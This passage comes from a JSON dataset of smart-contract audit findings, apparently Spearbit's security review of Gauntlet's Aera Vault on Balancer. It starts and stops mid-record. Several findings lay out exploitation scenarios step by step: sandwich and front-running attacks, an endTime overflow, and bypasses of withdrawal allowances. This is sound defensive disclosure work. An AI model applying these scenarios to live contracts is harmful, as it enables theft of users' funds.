        "body": "The current sweep() implementation allows the vault owner (the Treasury) to sweep any token owned by the vault including BPTs (Balancer Pool Tokens) that have been minted by the Vault during the pools initialDeposit() function call. The current vault implementation does not need those BPTs to withdraw funds because they are passed directly through the AssetManager flow via withdraw()/finalize(). Being able to withdraw BPTs would allow the Treasury to:  Withdraw funds without respecting the time period between initiateFinalization() and finalize() calls.  Withdraw funds without respecting Validator allowance() limits.  Withdraw funds without paying the managers fee for the last withdraw().  finalize the pool, withdrawing all funds and selling valueless BPTs on the market.  Sell or rent out BPTs and withdraw() funds afterwards, thus doubling the funds. Swap fees would not be paid because Treasury could call setManager(newManager), where the new manager is someone controlled by the Treasury, subsequently calling setSwapFee(0) to remove the swap fee, which would be applied during an exitPool() event. Note: Once the BPT is retrieved it can also be used to call exitPool(), as the mustAllowlistLPs check is ignored in exitPool().",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Manager can cause an immediate weight change",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Balancers ManagedPool uses 32 bit values for startTime and endTime but it does not verify if those values exist within that range. When endTime is set to 2**32 it becomes larger than startTime so the _require(startTime <= endTime, ...) statement will not revert. When endTime is converted to 32 bits it will get a value of 0, so in _calcu- lateWeightChangeProgress() the test if (currentTime >= endTime) ... will be true, causing the weight to immediately reach the end value. This way the Manager can cause an immediate weight change via the updateWeightsGradually() function and open arbitrage opportunities. Note: startTime is also subject to this overflow problem. Note: the same issues occur in the latest version of ManagedPool. Note: This issue has been reported to Balancer by the Spearbit team. 7 Also see the following issues:  Managed Pools are still undergoing development and may contain bugs and/or change significantly  Important fields of Balancer can be overwritten by EndTime contract ManagedPool is BaseWeightedPool, ReentrancyGuard { function updateWeightsGradually(uint256 startTime, uint256 endTime, ... ) { ... uint256 currentTime = block.timestamp; startTime = Math.max(currentTime, startTime); _require(startTime <= endTime, Errors.GRADUAL_UPDATE_TIME_TRAVEL); // will not revert if ,! endTime == 2**32 ... _startGradualWeightChange(startTime, endTime, _getNormalizedWeights(), endWeights, tokens); } function _startGradualWeightChange(uint256 startTime, uint256 endTime, ... ) ... { ... _setMiscData( _getMiscData().insertUint32(startTime, _START_TIME_OFFSET).insertUint32(endTime, ,! _END_TIME_OFFSET) ); // this convert the values to 32 bits ... } function _calculateWeightChangeProgress() private view returns (uint256) { uint256 currentTime = block.timestamp; bytes32 poolState = _getMiscData(); uint256 startTime = poolState.decodeUint32(_START_TIME_OFFSET); uint256 endTime = poolState.decodeUint32(_END_TIME_OFFSET); if (currentTime >= endTime) { // will be true if endTime == (2**32) capped to 32 bits == 0 return FixedPoint.ONE; } else ... ... } }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: High Risk"
        ]
    },
    {
        "title": "deposit and withdraw functions are susceptible to sandwich attacks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Transactions calling the deposit() function are susceptible to sandwich attacks where an attacker can extract value from deposits. A similar issue exists in the withdraw() function but the minimum check on the pool holdings limits the attacks impact. Consider the following scenario (swap fees ignored for simplicity): 1. Suppose the Balancer pool contains two tokens, WETH and DAI, and weights are 0.5 and 0.5. Currently, there is 1 WETH and 3k DAI in the pool and WETH spot price is 3k. 2. The Treasury wants to add another 3k DAI into the Aera vault, so it calls the deposit() function. 3. The attacker front-runs the Treasurys transaction. They swap 3k DAI into the Balancer pool and get out 0.5 WETH. The weights remain 0.5 and 0.5, but because WETH and DAI balances become 0.5 and 6k, WETHs spot price now becomes 12k. 4. Now, the Treasurys transaction adds 3k DAI into the Balancer pool and upgrades the weights to 0.5*1.5: 0.5 = 0.6: 0.4. 5. The attacker back-runs the transaction and swaps the 0.5 WETH they got in step 3 back to DAI (and recovers the WETHs spot price to near but above 3k). According to the current weights, they can get 9k*(1 - 1/r) = 3.33k DAI from the pool, where r = (20.4)(1/0.6). 6. As a result the attacker profits 3.33k - 3k = 0.33k DAI.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: High Risk"
        ]
    },
    {
        "title": "allowance() doesnt limit withdraw()s",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The allowance() function is meant to limit withdraw amounts. However, allowance() can only read and not alter state because its visibility is set to view. Therefore, the withdraw() function can be called on demand until the entire Vault/Pool balance has been drained, rendering the allowance() function ineffective. function withdraw(uint256[] calldata amounts) ... { ... uint256[] memory allowances = validator.allowance(); ... for (uint256 i = 0; i < tokens.length; i++) { if (amounts[i] > holdings[i] || amounts[i] > allowances[i]) { revert Aera__AmountExceedAvailable(... ); } } } // can't update state due to view function allowance() external view override returns (uint256[] memory amounts) { amounts = new uint256[](count); for (uint256 i = 0; i < count; i++) { amounts[i] = ANY_AMOUNT; } } from both IWithdrawal-",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Malicious manager could cause Vault funds to be inaccessible",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The calculateAndDistributeManagerFees() function pushes tokens to the manager and if for unknown reasons this action fails the entire Vault would be blocked and funds become inaccessible. This occurs because the following functions depend on the execution of calculateAndDistributeManagerFees(): deposit(), withdraw(), setManager(), claimManagerFees(), initiateFinalization(), and therefore final- ize() as well. Within calculateAndDistributeManagerFees() the function safeTransfer() is the riskiest and could fail under the following situations:  A token with a callback is used, for example an ERC777 token, and the callback is not implemented correctly.  A token with a blacklist option is used and the manager is blacklisted. For example USDC has such blacklist functionality. Because the manager can be an unknown party, a small risk exist that he is malicious and his address could be blacklisted in USDC. Note: set as high risk because although probability is very small, impact results in Vault funds to become inacces- sible. function calculateAndDistributeManagerFees() internal { ... for (uint256 i = 0; i < amounts.length; i++) { tokens[i].safeTransfer(manager, amounts[i]); } }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: High Risk"
        ]
    },
    {
        "title": "updateWeightsGradually allows change rates to start in the past with a very high maximumRatio",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The current updateWeightsGradually is using startTime instead of time that should be Math.max(block.timestamp, startTime). Because internally Balancer will use startTime = Math.max(currentTime, startTime); as the startTime, this allows to: the minimal start  Have a startTime in the past.  Have a targetWeights[i] higher than allowed. We also suggest adding another check to prevent startTime > endTime. Although Balancer replicates the same check it is still needed in the Aera implementation to prevent transactions to revert because of an underflow error on uint256 duration = endTime - startTime;",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: High Risk"
        ]
    },
    {
        "title": "The vault manager has unchecked power to create arbitrage using setSwapFees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "A previously known issue was that a malicious vault manager could arbitrage the vault like in the below scenario: 1. Set the swap fees to a high value by setSwapFee (10% is the maximum). 2. Wait for the market price to move against the spot price. 3. In the same transaction, reduce the swap fees to ~0 (0.0001% is the minimum) and arbitrage the vault. The proposed fix was to limit the percentage change of the swap fee to a maximum of MAXIMUM_SWAP_FEE_- PERCENT_CHANGE each time. However, because there is no restriction on how many times the setSwapFee function can be called in a block or transaction, a malicious manager can still call it multiple times in the same transaction and eventually set the swap fee to the value they want.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Implement a function to claim liquidity mining rewards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Balancer offers a liquidity mining rewards distribution for liquidity providers. Liquidity Mining distributions are available to claim weekly through the MerkleOrchard contract. Liquid- ity Providers can claim tokens from this contract by submitting claims to the tokens. These claims are checked against a Merkle root of the accrued token balances which are stored in a Merkle tree. Claim- ing through the MerkleOrchard is much more gas-efficient than the previous generation of claiming contracts, especially when claiming multiple weeks of rewards, and when claiming multiple tokens. The AeraVault is itself the only liquidity provider of the Balancer pool deployed, so each week its entitled to claim those rewards. Currently, those rewards cannot be claimed because the AeraVault is missing an implementation to interact with the MerkleOrchard contract, causing all rewards (BAL + other tokens) to remain in the MerkleOrchard forever.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Owner can circumvent allowance() via enableTradingWithWeights()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The vault Owner can set arbitrary weights via disableTrading() and then call enableTrading- WithWeights() to set the spot price and create arbitrage opportunities for himself. This way allowance() in withdraw() checks, which limit the amount of funds an owner can withdraw, can be circumvented. Something similar can be done with enableTradingRiskingArbitrage() in combination with sufficient time. Also see the following issues:  allowance() doesnt limit withdraw()s  enableTradingWithWeights allow the Treasury to change the pools weights even if the swap is not disabled  Separation of concerns Owner and Manager function disableTrading() ... onlyOwnerOrManager ... { setSwapEnabled(false); } function enableTradingWithWeights(uint256[] calldata weights) ... onlyOwner ... { ... pool.updateWeightsGradually(timestamp, timestamp, weights); setSwapEnabled(true); } function enableTradingRiskingArbitrage() ... onlyOwner ... { setSwapEnabled(true); } 13",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Front-running attacks on finalize could affect received token amounts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The returnFunds() function (called by finalize()) withdraws the entire holdings in the Balancer pool but does not allow the caller to specify and enforce the minimum amount of received tokens. Without such check the finalize() function could be susceptible to a front-running attack. A potential exploit scenario looks as follows: 1. The notice period has passed and the Treasury calls finalize() on the Aera vault. Assume the Balancer pool contains 1 WETH and 3000 DAI, and that WETH and DAI weights are both 0.5. 2. An attacker front-runs the Treasurys transaction and swaps in 3000 DAI to get 0.5 WETH from the pool. 3. As an unexpected result, the Treasury receives 0.5 WETH and 6000 DAI. Therefore an attacker can force the Treasury to accept the trade that they offer. Although the Treasury can execute a reverse trade on another market to recover the token amount and distribution, not every Treasury can execute such trade (e.g., if a timelock controls it). Notice that the attacker may not profit from the swap because of slippage but they could be incentivized to perform such an attack if it causes considerable damage to the Treasury.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "safeApprove in depositToken could revert for non-standard token like USDT",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Some non-standard tokens like USDT will revert when a contract or a user tries to approve an al- lowance when the spender allowance has already been set to a non zero value. In the current code we have not seen any real problem with this fact because the amount retrieved via depositToken() is approved send to the Balancer pool via joinPool() and managePoolBalance(). Balancer transfers the same amount, lowering the approval to 0 again. However, if the approval is not lowered to exactly 0 (due to a rounding error or another unfore- seen situation) then the next approval in depositToken() will fail (assuming a token like USDT is used), blocking all further deposits. Note: Set to medium risk because the probability of this happening is low but impact would be high. We also should note that OpenZeppelin has officially deprecated the safeApprove function, suggesting to use instead safeIncreaseAllowance and safeDecreaseAllowance.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Consult with Balancer team about best approach to add and remove funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The Aera Vault uses AssetManagers functionality of function managePoolBalance() to add and remove funds. The standard way to add and remove funds in Balancer is via joinPool() / exitPool(). Using the managePoolBalance() function might lead to future unexpected behavior. Additionally, this disables the capacity to implement the original intention of AssetManagers functionality, e.g. storing funds elsewhere to generate yield.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Fee on transfer can block several functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Some tokens have a fee on transfer, for example USDT. Usually such fee is not enabled but could be re-enabled at any time. With this fee enabled the withdrawFromPool() function would receive slightly less tokens than the amounts requested from Balancer causing the next safeTransfer() call to fail because there are not enough tokens inside the contract. This means withdraw() calls will fail. Functions deposit() and calculateAndDistributeManagerFees() can also fail because they have similar code. Note: The function returnFunds() is more robust and can handle this problem. Note: The problem can be alleviated by sending additional tokens directly to the Aera Vault contract to compensate for fees, lowering the severity of the problem to medium. function withdraw(uint256[] calldata amounts) ... { ... withdrawFromPool(amounts); // could get slightly less than amount with a fee on transfer ... for (uint256 i = 0; i < amounts.length; i++) { if (amounts[i] > 0) { tokens[i].safeTransfer(owner(), amounts[i]); // could revert it the full amounts[i] isn't ,! available ... } ... } }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "enableTradingWithWeights allow the Treasury to change the pools weights even if the swap is not disabled",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "enableTradingWithWeights is a function that can only be called by the owner of the Aera Vault contract and that should be used only to re-enable the swap feature on the pool while updating token weights. The function does not verify if the pools swap feature is enabled and for this reason, as a result, it allows the Treasury to act as the manager who is the only actor allowed to change the pool weights. The function should add a check to ensure that it is only callable when the pools swap is disabled.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "AeraVault constructor is not checking all the input parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The Aera Vault constructor has the role to handle Balancers ManagedPool deployment. The con- structor should increase the number of user input validation and the Gauntlet team should be aware of the possible edge case that could happen given that the deployment of the Aera Vault is handled directly by the Treasury and not by the Gauntlet team itself. We are going to list all the worst-case scenarios that could happen given the premise that the deployments are handled by the Treasury. 1. factory could be a wrapper contract that will deploy a ManagedPool. This would mean that the deployer could pass correct parameters to Aera Vault to pass these checks, but will use custom and malicious parameters on the factory wrapper to deploy the real Balancer pool. 2. swapFeePercentage value is not checked. On Balancer, the deployment will revert if the value is not in- side this range >= 1e12 (0.0001%) and <= 1e17 (10% - this fits in 64 bits). Without any check, the Gauntlet accept to follow the Balancers swap requirements. 3. manager_ is not checked. They could set the manager as the Treasury (owner of the vault) itself. This would give the Treasury the full power to manage the Vault. At least these values should be checked: address(0), address(this) or owner(). The same checks should also be done in the setManager() function. 4. validator_ could be set to a custom contract that will give full allowances to the Treasury. This would make the withdraw() act like finalize() allowing to withdraw all the funds from the vault/pool. 17 5. noticePeriod_ has only a max value check. Gauntlet team explained that a time delay between the ini- tialization of the finalize process and the actual finalize is needed to prevent the Treasury to be able to instantly withdraw all the funds. Not having a min value check allow the Treasury to set the value to 0 so there would be no delay between the initiateFinalization() and finalize() because noticeTimeoutAt == block.timestamp. 6. managementFee_ has no minimum value check. This would allow the Treasury to not pay the manager because the managerFeeIndex would always be 0. 7. description_ can be empty. From the Specification PDF, the description of the vault has the role to De- scribes vault purpose and modelling assumptions for differentiating between vaults. Being empty could lead to a bad UX for external services that needs to differentiate different vaults. These are all the checks that are done directly by Balancer during deployment via the Pool Factory:  BasePool constructor#L94-L95 min and max number of tokens.  BasePool constructor#L102token array is sorted following Balancer specification (sorted by token address).  BasePool constructor calling _setSwapFeePercentage min and max value for swapFeePercentage.  BasePool constructor calling vault.registerTokens token address uniqueness (cant have same Following the pathBasePool is calling from function _registerMinimalSwapInfoPoolTokens it also checks that token != IERC20(0). should that call token in the pool), vault.registerTokens MinimalSwapInfoPoolsBalance.  ManagedPool constructor calling _startGradualWeightChange Check min value of weight and that the total sum of the weights are equal to 100%. _startGradualWeightChange internally check that endWeight >= WeightedMath._MIN_WEIGHT and normalizedSum == FixedPoint.ONE.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Possible mismatch between Validator.count and AeraVault assets count",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "A weak connection between WithdrawalValidator and Aera Vault could lead to the inability of withdrawing from a Vault. Consider the following scenario: The Validator is deployed with a tokenCount < than Vault.getTokens().length. Inside the withdraw() function we reference the following code block: uint256[] memory allowances = validator.allowance(); uint256[] memory weights = getNormalizedWeights(); uint256[] memory newWeights = new uint256[](tokens.length); for (uint256 i = 0; i < tokens.length; i++) { if (amounts[i] > holdings[i] || amounts[i] > allowances[i]) { revert Aera__AmountExceedAvailable( address(tokens[i]), amounts[i], holdings[i].min(allowances[i]) ); } } A scenario where allowances.length < tokens.length would cause this function to revert with an Index out of bounds error. The only way for the Treasury to withdraw funds would be via the finalize() method which has a time delay.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Ensure vaults deployment integrity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The treasury could deploy on purpose or by accident a slightly different version of the contract and introduce bugs or backdoors. This might not be recognized by parties taking on Manager responsibilities (e.g. usually Gauntlet will be involved here).",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Frequent calling of calculateAndDistributeManagerFees() lowers fees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Via calculateAndDistributeManagerFees() a percentage of the Pool is subtracted and sent to the Manager. If this function is called too frequently his fees will be lower. For example:  If he calls it twice, while both time getting 1%, he actually gets: 1% + 1% * (100% - 1%) = 1.99%  If he waits longer until he has earned 2%, he actually gets: 2%, which is slightly more than 1.99%  If called very frequently the fees go to 0 (especially taking in account the rounding down). However the gas cost would be very high. The Manager can (accidentally) do this by calling claimManagerFees(). The Owner can (accidentally or on pur- pose (e.g. using 0 balance change) ) do this by calling deposit(), withdraw() or setManager(). Note: Rounding errors make this slightly worse. Also see the following issue: Possible rounding down of fees function claimManagerFees() ... { calculateAndDistributeManagerFees(); // get a percentage of the Pool }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "OpenZeppelin best practices",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The Aera Vault uses OpenZeppelin release 4.3.2 which is copied into their github. The current release of OpenZeppelin is 4.6.0 and includes several updates and security fixes. The copies of the OpenZeppelin files are also (manually) changed to adapt the import paths. This has the risk of making a mistake in the process. import \"./dependencies/openzeppelin/SafeERC20.sol\"; import \"./dependencies/openzeppelin/IERC20.sol\"; import \"./dependencies/openzeppelin/IERC165.sol\"; import \"./dependencies/openzeppelin/Ownable.sol\"; import \"./dependencies/openzeppelin/ReentrancyGuard.sol\"; import \"./dependencies/openzeppelin/Math.sol\"; import \"./dependencies/openzeppelin/SafeCast.sol\"; import \"./dependencies/openzeppelin/ERC165Checker.sol\";",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Possible rounding down of fees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "If certain token has a few decimals numbers then fees could be rounded down to 0, especially if time between calculateAndDistributeManagerFees() is relatively small. This also could slightly shift the spot price because the balance of one coin is lowered while the other remains still. With fewer decimals the situation worsens, e.g. Gemini USD GUSD has 2 decimals, therefore the problem occurs with a balance of 10_000 GUSD. Note: The rounding down is probably neglectable in most cases. function calculateAndDistributeManagerFees() internal { ... for (uint256 i = 0; i < tokens.length; i++) { amounts[i] = (holdings[i] * managerFeeIndex) / ONE; // could be rounded down to 0 } ... } With 1 USDC in the vault and 2 hours between calculateAndDistributeManagerFees(), the fee for USDC is rounded down to 0. This behavior is demonstrated in the following POC: 21 import \"hardhat/console.sol\"; contract testcontract { uint256 constant ONE = 10**18; uint managementFee = 10**8; constructor() { // MAX_MANAGEMENT_FEE = 10**9; // 1 USDC uint holdings = 1E6; uint delay = 2 hours; uint managerFeeIndex = delay * managementFee; uint amounts = (holdings * managerFeeIndex) / ONE; console.log(\"Fee\",amounts); // fee is 0 } }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing nonReentrant modifier on initiateFinalization(), setManager() and claimManagerFees() functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The initiateFinalization() function is missing a nonReentrant modifier while calculateAnd- DistributeManagerFees() executes external calls. Same goes for setManager() and claimManagerFees() func- tions.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Potential division by 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "If the balance (e.g. holdings[]) of a token is 0 in deposit() then the dividing by holdings[] would cause a revert. Note: Function withdraw() has similar code but when holdings[]==0 its not possible to withdraw() anyway. Note: The current Mannon vault code will not allow the balances to be 0. Note: Although not used in the current code, in order to do a deregisterTokens(), Balancer requires the balance to be 0. Additionally, refer to the following Balancer documentation about the-vault#deregistertokens. The worst case scenario is deposit() not working. function deposit(uint256[] calldata amounts) ... { ... for (uint256 i = 0; i < amounts.length; i++) { if (amounts[i] > 0) { depositToken(tokens[i], amounts[i]); uint256 newBalance = holdings[i] + amounts[i]; newWeights[i] = (weights[i] * newBalance) / holdings[i]; // would revert if holdings[i] == 0 } ... ... } Similar divisions by 0 could occur in getWeightChangeRatio(). The function is called from updateWeightsGradu- ally(). If this is due to targetWeight being 0, then it is the desired result. Current weight should not be 0 due balancer checks. function getWeightChangeRatio(uint256 weight, uint256 targetWeight) ... { return weight > targetWeight ? (ONE * weight) / targetWeight : (ONE * targetWeight) / weight; // could revert if targetWeight == 0 // could revert if weight== 0 }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use ManagedPoolFactory instead of BaseManagedPoolFactory to deploy the Balancer pool",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Currently the Aera Vault is using BaseManagedPoolFactory as the factory to deploy the Balancer pool while Balancers documentation recommends and encourages the usage of ManagedPoolFactory. Quoting the doc inside the BaseManagedPoolFactory: This is a base factory designed to be called from other factories to deploy a ManagedPool with a particular controller/owner. It should NOT be used directly to deploy ManagedPools without controllers. ManagedPools controlled by EOAs would be very dangerous for LPs. There are no restrictions on what the managers can do, so a malicious manager could easily manipulate prices and drain the pool. In this design, other controller-specific factories will deploy a pool controller, then call this factory to deploy the pool, passing in the controller as the owner. 23",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Adopt the two-step ownership transfer pattern",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "To prevent the Aera vault Owner, i.e. the Treasury, from calling renounceOwnership() and effec- tively breaking vault critical functions such as withdraw() and finalize(), the renounceOwnership() function is explicitly overridden to revert the transaction every time. However, the transferOwnership() function may also lead to the same issue if the ownership is transferred to an uncontrollable address because of human errors or attacks on the Treasury.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Implement zero-address check for manager_",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Non-existent zero-address checks inside the constuctor for the manager_ parameter. If manager_- becomes a zero address then calls to calculateAndDistributeManagerFees will burn tokens (transfer them to address(0)).",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Simplify tracking of managerFeeIndex",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The calculateAndDistributeManagerFees() function uses updateManagerFeeIndex() to keep track of management fees. It keeps track of both managerFeeIndex and lastFeeCheckpoint in storage vari- ables (e.g. costing SLOAD/SSTORE). However, because managementFee is immutable this can be simplified to one storage variable, saving gas and improving code legibility. uint256 public immutable managementFee; // can't be changed function calculateAndDistributeManagerFees() internal { updateManagerFeeIndex(); ... if (managerFeeIndex == 0) { return; use managerFeeIndex } ... // ... managerFeeIndex = 0; ... } function updateManagerFeeIndex() internal { managerFeeIndex += (block.timestamp - lastFeeCheckpoint) * managementFee; lastFeeCheckpoint = block.timestamp.toUint64(); }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Directly call getTokensData() from returnFunds()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The function returnFunds() calls getHoldings() and getTokens(). Both functions call getTokens- Data() thus waste gas unnecessarily. function returnFunds() internal returns (uint256[] memory amounts) { uint256[] memory holdings = getHoldings(); IERC20[] memory tokens = getTokens(); ... } function getHoldings() public view override returns (uint256[] memory amounts) { (, amounts, ) = getTokensData(); } function getTokens() public view override returns (IERC20[] memory tokens) { (tokens, , ) = getTokensData(); }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Change uint32 and uint64 to uint256",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The contract contains a few variables/constants that are smaller than uint256: noticePeriod, no- ticeTimeoutAt and lastFeeCheckpoint. This doesnt actually save gas because they are not part of a struct and still take up a storage slot. It even costs more gas because additional bits have to be stripped off. Additionally, there is a very small risk of lastFeeCheckpoint wrapping to 0 in the updateManagerFeeIndex() function. If that would happen, managerFeeIndex would get far too large and too many fees would be paid out. Finally, using int256 simplifies the code. contract AeraVaultV1 is IAeraVaultV1, Ownable, ReentrancyGuard { ... uint32 public immutable noticePeriod; ... uint64 public noticeTimeoutAt; ... uint64 public lastFeeCheckpoint = type(uint64).max; ... } function updateManagerFeeIndex() internal { managerFeeIndex += (block.timestamp - lastFeeCheckpoint) * managementFee; // could get large when lastFeeCheckpoint wraps lastFeeCheckpoint = block.timestamp.toUint64(); }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use block.timestamp directly instead of assigning it to a temporary variable.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "It is preferable to use block.timestamp directly in your code instead of assigning it to a temporary variable as it only uses 2 gas.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Consider replacing pool.getPoolId() with bytes32 public immutable poolId to save gas and ex- ternal calls",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The current implementation of Aera Vault always calls pool.getPoolId() or indirectly getPoolId() to retrieve the ID of the immutable state variable pool that has been declared at constructor time. The pool.getPoolId() is a getter function defined in the Balancer BasePool contract: function getPoolId() public view override returns (bytes32) { return _poolId; } Inside the same BasePool contract the _poolId is defined as immutable which means that after creating a pool it will never change. For this reason it is possible to apply the same logic inside the Aera Vault and use an immutable variable to avoiding external calls and save gas.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Save values in temporary variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "We observed multiple occurrences in the codebase where <var>.length was used in for loops. This could lead to more gas consumption as .length gets called repetitively until the for loop finishes. When indexed variables are used multiple times inside the loop in a read only way these can be stored in a temporary variable to save some gas. for (uint256 i = 0; i < tokens.length; i++) { // tokens.length has to be calculated repeatedly ... ... = tokens[i].balanceOf(...); tokens[i].safeTransfer(owner(), ...); } // tokens[i] has to be evaluated multiple times",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Aera could be prone to out-of-gas transaction revert when managing a high number of tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The Balancer ManagedPool used by Aera has a max limit of 50 token. Functions like: initialDeposit(), deposit(), withdraw() and finalize() involve numerous external direct and indirect (made by Balancer itself when called by Aera) calls and math calculations that are done for each token managed by the pool. The functions deposit() and withdraw() are especially gas intensive, given that they also internally call calcu- lateAndDistributeManagerFees() that will transfer, for each token, a management fee to the manager. For these reasons Aera should be aware that a high number of tokens managed by the Aera Vault could lead to out-of-gas reverts (max block size depends on which chain the project will be deployed).",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use a consistent way to call getNormalizedWeights()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
